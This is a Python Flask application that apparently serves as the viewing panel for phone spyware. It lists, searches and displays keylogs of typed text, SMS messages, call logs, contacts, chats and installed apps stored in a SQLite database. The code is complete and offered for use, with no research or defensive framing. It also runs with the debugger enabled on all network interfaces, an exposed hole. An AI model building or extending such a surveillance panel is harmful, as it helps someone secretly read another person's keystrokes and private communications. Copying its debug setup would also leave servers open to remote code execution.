from flask import Flask, render_template, request, jsonify
import sqlite3
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

def get_db_connection():
    try:
        conn = sqlite3.connect('data.db')
        conn.row_factory = sqlite3.Row
        return conn
    except sqlite3.Error as e:
        logging.error(f"Database error: {e}")
        return None

# Routes for serving HTML pages:
@app.route('/')
def index():
    # This route now only needs to render the base template.
    # The chat list will be loaded dynamically by app.js.
    return render_template('index.html')

@app.route('/calls')
def calls():
    return render_template('calls.html')

@app.route('/keylogs')
def keylogs():
    return render_template('keylogs.html')

@app.route('/contacts')
def contacts():
    return render_template('contacts.html')

@app.route('/sms')
def sms():
    return render_template('sms.html')

@app.route('/installed_apps')
def installed_apps():
    return render_template('installed_apps.html')

# Routes for fetching data (used by app.js):

@app.route('/get_chats', methods=['GET'])
def get_chats():
    conn = get_db_connection()
    if conn:
        try:
            chats = conn.execute('''
                SELECT 
                    c.name,
                    (SELECT text FROM ChatMessages WHERE sender = c.name ORDER BY time DESC LIMIT 1) as last_message,
                    (SELECT time FROM ChatMessages WHERE sender = c.name ORDER BY time DESC LIMIT 1) as time
                FROM (SELECT DISTINCT sender as name FROM ChatMessages) c
                ORDER BY time DESC
            ''').fetchall()
            return jsonify([dict(row) for row in chats])
        except Exception as e:
            logging.error(f"Error fetching chats: {e}")
            return jsonify({'error': 'Failed to fetch chats'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

@app.route('/get_calls', methods=['GET'])
def get_calls():
    conn = get_db_connection()
    if conn:
        try:
            calls = conn.execute('SELECT * FROM Calls ORDER BY time DESC').fetchall()
            return jsonify([dict(row) for row in calls])
        except Exception as e:
            logging.error(f"Error fetching calls: {e}")
            return jsonify({'error': 'Failed to fetch calls'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

@app.route('/get_keylogs', methods=['GET'])
def get_keylogs():
    conn = get_db_connection()
    if conn:
        try:
            keylogs = conn.execute('SELECT * FROM Keylogs ORDER BY time DESC').fetchall()
            return jsonify([dict(row) for row in keylogs])
        except Exception as e:
            logging.error(f"Error fetching keylogs: {e}")
            return jsonify({'error': 'Failed to fetch keylogs'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

@app.route('/get_contacts', methods=['GET'])
def get_contacts():
    conn = get_db_connection()
    if conn:
        try:
            contacts = conn.execute('SELECT * FROM Contacts ORDER BY name').fetchall()
            return jsonify([dict(row) for row in contacts])
        except Exception as e:
            logging.error(f"Error fetching contacts: {e}")
            return jsonify({'error': 'Failed to fetch contacts'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

@app.route('/get_sms', methods=['GET'])
def get_sms():
    conn = get_db_connection()
    if conn:
        try:
            sms = conn.execute('''
                SELECT 
                    from_to,
                    text,
                    time
                FROM SMS
                ORDER BY time DESC
            ''').fetchall()
            return jsonify([dict(row) for row in sms])
        except Exception as e:
            logging.error(f"Error fetching SMS: {e}")
            return jsonify({'error': 'Failed to fetch SMS'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

@app.route('/get_installed_apps', methods=['GET'])
def get_installed_apps():
    conn = get_db_connection()
    if conn:
        try:
            apps = conn.execute('SELECT * FROM InstalledApps ORDER BY application_name').fetchall()
            return jsonify([dict(row) for row in apps])
        except Exception as e:
            logging.error(f"Error fetching installed apps: {e}")
            return jsonify({'error': 'Failed to fetch installed apps'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

# Routes for handling search:

@app.route('/search_chats', methods=['POST'])
def search_chats():
    return search_data('ChatMessages', ['sender', 'text'])

@app.route('/search_calls', methods=['POST'])
def search_calls():
    return search_data('Calls', ['from_to', 'call_type'])

@app.route('/search_keylogs', methods=['POST'])
def search_keylogs():
    return search_data('Keylogs', ['application', 'text'])

@app.route('/search_contacts', methods=['POST'])
def search_contacts():
    return search_data('Contacts', ['name', 'phone_number', 'email'])

@app.route('/search_sms', methods=['POST'])
def search_sms():
    return search_data('SMS', ['from_to', 'text'])

@app.route('/search_apps', methods=['POST'])
def search_apps():
    return search_data('InstalledApps', ['application_name', 'package_name'])

def search_data(table, columns):
    search_term = request.form.get('search_term')
    if not search_term:
        return jsonify([])

    conn = get_db_connection()
    if not conn:
        return jsonify({'error': 'Database connection failed'}), 500

    try:
        query = f'''
            SELECT *
            FROM {table}
            WHERE {' OR '.join(f"{col} LIKE ?" for col in columns)}
            ORDER BY {'time DESC' if 'time' in get_columns(conn, table) else 'name'}
            LIMIT 50
        '''
        results = conn.execute(query, [f'%{search_term}%'] * len(columns)).fetchall()
        return jsonify([dict(row) for row in results])
    except Exception as e:
        logging.error(f"Search error in table {table}: {e}")
        return jsonify({'error': 'Search failed'}), 500
    finally:
        conn.close()

def get_columns(conn, table):
    # Helper function to get column names of a table
    cursor = conn.execute(f"PRAGMA table_info({table})")
    return [row['name'] for row in cursor]

# Route for individual chat messages
@app.route('/chat/<name>')
def chat(name):
    conn = get_db_connection()
    if conn:
        try:
            messages = conn.execute('''
                SELECT *
                FROM ChatMessages
                WHERE sender = ? OR sender = 'You'
                ORDER BY time
            ''', (name,)).fetchall()
            return jsonify([dict(row) for row in messages])
        except Exception as e:
            logging.error(f"Error fetching chat messages for {name}: {e}")
            return jsonify({'error': 'Failed to fetch chat messages'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

# Route for individual SMS messages
@app.route('/sms/<name>')
def sms_messages(name):
    conn = get_db_connection()
    if conn:
        try:
            messages = conn.execute('''
                SELECT *
                FROM SMS
                WHERE from_to = ?
                ORDER BY time DESC
            ''', (name,)).fetchall()
            return jsonify([dict(row) for row in messages])
        except Exception as e:
            logging.error(f"Error fetching SMS messages for {name}: {e}")
            return jsonify({'error': 'Failed to fetch SMS messages'}), 500
        finally:
            conn.close()
    return jsonify({'error': 'Database connection failed'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)